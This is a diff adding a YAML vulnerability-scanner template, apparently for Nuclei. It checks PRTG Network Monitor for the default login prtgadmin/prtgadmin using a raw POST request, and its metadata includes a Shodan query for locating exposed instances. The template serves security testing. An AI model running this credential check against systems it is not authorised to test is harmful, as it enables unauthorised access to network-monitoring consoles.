@@ -1,0 +1,42 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          part: header
+          type: word
+          words:
+            - OCTOPUS
+            - /home
+        - status:
+            - 302
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - prtgadmin
+        username:
+            - prtgadmin
+      raw:
+        - |
+          POST /public/checklogin.htm HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          loginurl=&username={{username}}&password={{password}}
+id: prtg-default-login
+info:
+    author: johnk3r
+    classification:
+        cwe-id: CWE-798
+    description: PRTG Network Monitor contains a hardcoded credential vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        max-request: 1
+        shodan-query: http.favicon.hash:-655683626
+    name: PRTG Network Monitor - Hardcoded Credentials
+    reference:
+        - https://www.paessler.com/manuals/prtg/login
+    severity: high
+    tags:
+        - prtg
+        - default-login
+        - prtg network monitor
